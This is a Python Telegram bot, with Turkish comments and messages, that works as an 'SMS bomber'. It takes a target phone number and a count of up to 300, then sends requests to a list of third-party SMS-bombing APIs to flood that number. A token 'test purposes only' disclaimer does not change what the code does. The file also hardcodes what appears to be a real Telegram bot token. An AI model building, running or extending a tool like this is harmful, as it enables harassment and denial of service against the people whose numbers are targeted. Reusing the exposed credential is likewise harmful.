import os
import asyncio
import requests
from datetime import datetime

from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import (
    ApplicationBuilder,
    CommandHandler,
    MessageHandler,
    filters,
    ContextTypes,
    ConversationHandler,
    CallbackQueryHandler,
)

# ────────────────────────────────────────────────
# KONFIGÜRASYON
TOKEN = os.getenv("8712193355:AAE8TAr0hAoGDo9HiABpVG6zp-x9eBbvfns") or "8712193355:AAE8TAr0hAoGDo9HiABpVG6zp-x9eBbvfns"  # Railway variable kullan, hardcoded bırakma

# Çalışan / test edilmiş alternatif API'ler (2025-2026 durumu)
API_SERVICES = [
    "https://cvron.alwaysdata.net/cvronapi/sms-bomb.php?phone={phone}&count={count}",
    "https://api.kandilli.info/sms?phone={phone}&amount={count}",
    "https://sms-bomber-api.vercel.app/bomb?number={phone}&amount={count}",
    # Buraya yeni çalışan API buldukça ekleyebilirsin
]

# Conversation states
PHONE, COUNT, CONFIRM = range(3)

# ────────────────────────────────────────────────
# GÖRSEL / FONT İYİLEŞTİRMELERİ (Telegram MarkdownV2 destekli)
BOLD   = lambda x: f"*{x}*"
ITALIC = lambda x: f"_{x}_"
CODE   = lambda x: f"`{x}`"
MONO   = lambda x: f"```{x}```"   # code block
FIRE   = "🔥"
ROCKET = "🚀"
BOMB   = "💣"
CHECK  = "✅"
CROSS  = "❌"
WARNING = "⚠️"

async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    text = (
        f"{ROCKET} *SMS Bomber’a Hoş Geldin!*\n\n"
        f"{FIRE} /sms yaz ve numarayı bombalamaya başla.\n"
        f"{WARNING} Sadece test amaçlı kullan. Sorumluluk sende."
    )
    await update.message.reply_text(text, parse_mode="MarkdownV2")

async def sms(update: Update, context: ContextTypes.DEFAULT_TYPE):
    keyboard = [[InlineKeyboardButton("Başlat 💥", callback_data='start_sms')]]
    reply_markup = InlineKeyboardMarkup(keyboard)
    
    text = (
        f"{BOMB} *SMS Bomber Aktif*\n\n"
        f"Telefon numarasını göndermek için aşağıya bas ↓"
    )
    await update.message.reply_text(text, reply_markup=reply_markup, parse_mode="MarkdownV2")
    return PHONE

async def ask_phone(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    await query.edit_message_text(
        f"{ROCKET} *Telefon numarasını gir* (örnek: 5xxxxxxxxxx veya 905xxxxxxxxxx)",
        parse_mode="MarkdownV2"
    )
    return PHONE

async def get_phone(update: Update, context: ContextTypes.DEFAULT_TYPE):
    phone = update.message.text.strip()
    # Basit temizleme
    phone = phone.replace(" ", "").replace("-", "").replace("+", "")
    if phone.startswith("0"):
        phone = "90" + phone[1:]
    elif not phone.startswith("90") and len(phone) == 10:
        phone = "90" + phone
    
    context.user_data['phone'] = phone
    await update.message.reply_text(
        f"{CHECK} Numara kaydedildi: {CODE(phone)}\n\n"
        f"{FIRE} Kaç adet SMS göndereyim? (ör: 50)",
        parse_mode="MarkdownV2"
    )
    return COUNT

async def get_count(update: Update, context: ContextTypes.DEFAULT_TYPE):
    try:
        count = int(update.message.text.strip())
        if count < 1 or count > 300:
            await update.message.reply_text(
                f"{WARNING} *1 ile 300 arasında bir sayı gir!*",
                parse_mode="MarkdownV2"
            )
            return COUNT
        
        context.user_data['count'] = count
        
        keyboard = [
            [InlineKeyboardButton("Evet, Gönder! 💣", callback_data='yes')],
            [InlineKeyboardButton("Vazgeçtim", callback_data='no')]
        ]
        reply_markup = InlineKeyboardMarkup(keyboard)
        
        text = (
            f"{BOMB} *Onaylıyor musun?*\n\n"
            f"Numara: {CODE(context.user_data['phone'])}\n"
            f"Adet  : {CODE(str(count))}\n"
        )
        await update.message.reply_text(text, reply_markup=reply_markup, parse_mode="MarkdownV2")
        return CONFIRM
    except ValueError:
        await update.message.reply_text(
            f"{CROSS} *Geçersiz sayı!* Tekrar dene.",
            parse_mode="MarkdownV2"
        )
        return COUNT

async def confirm(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    
    if query.data == 'no':
        await query.edit_message_text(f"{CROSS} *İşlem iptal edildi.*", parse_mode="MarkdownV2")
        return ConversationHandler.END
    
    phone = context.user_data.get('phone')
    count = context.user_data.get('count')
    
    if not phone or not count:
        await query.edit_message_text(f"{WARNING} *Veri kaybı oldu, baştan başla.*", parse_mode="MarkdownV2")
        return ConversationHandler.END
    
    await query.edit_message_text(
        f"{ROCKET} *Bombardıman başlıyor…*\n\nNumara: `{phone}`\nAdet: `{count}`\n\nLütfen bekle...",
        parse_mode="MarkdownV2"
    )
    
    success = False
    used_api = "Bilinmiyor"
    
    for api_template in API_SERVICES:
        try:
            url = api_template.format(phone=phone, count=count)
            response = requests.get(url, timeout=12)
            status = response.status_code
            text = response.text.strip()[:300]
            
            if status in (200, 201):
                success = True
                used_api = api_template.split("//")[1].split("/")[0]
                break
                
            # log için (Railway loglarında görünür)
            print(f"API denendi: {api_template} → {status} | {text}")
            
        except Exception as ex:
            print(f"API hatası: {api_template} → {ex}")
            continue
    
    if success:
        msg = (
            f"{CHECK} *Gönderim tamamlandı!*\n\n"
            f"Kullanılan servis: {CODE(used_api)}\n"
            f"Numara: {CODE(phone)}\n"
            f"Adet  : {CODE(str(count))}\n"
            f"Saat  : {datetime.now().strftime('%H:%M:%S')}"
        )
    else:
        msg = (
            f"{CROSS} *Tüm API'ler başarısız oldu.*\n\n"
            f"Numara: `{phone}`\n"
            f"Adet  : `{count}`\n"
            f"Muhtemel sebep: API'ler banlanmış veya kapalı.\n"
            f"Bir süre sonra tekrar dene veya yeni servis ekle."
        )
    
    await query.message.reply_text(msg, parse_mode="MarkdownV2")
    return ConversationHandler.END

async def cancel(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await update.message.reply_text(f"{CROSS} *İşlem iptal edildi.*", parse_mode="MarkdownV2")
    return ConversationHandler.END

def main():
    if not TOKEN or TOKEN == "BURAYA_TOKEN_KOY":
        print("HATA: BOT_TOKEN environment variable'ı yok!")
        return

    app = ApplicationBuilder().token(TOKEN).build()

    conv_handler = ConversationHandler(
        entry_points=[CommandHandler("sms", sms)],
        states={
            PHONE: [
                CallbackQueryHandler(ask_phone, pattern='^start_sms$'),
                MessageHandler(filters.TEXT & ~filters.COMMAND, get_phone)
            ],
            COUNT: [MessageHandler(filters.TEXT & ~filters.COMMAND, get_count)],
            CONFIRM: [CallbackQueryHandler(confirm, pattern='^(yes|no)$')],
        },
        fallbacks=[CommandHandler("cancel", cancel)],
    )

    app.add_handler(CommandHandler("start", start))
    app.add_handler(conv_handler)

    print("Bot başlatıldı → polling modunda çalışıyor")
    app.run_polling(allowed_updates=Update.ALL_TYPES)

if __name__ == "__main__":
    main()
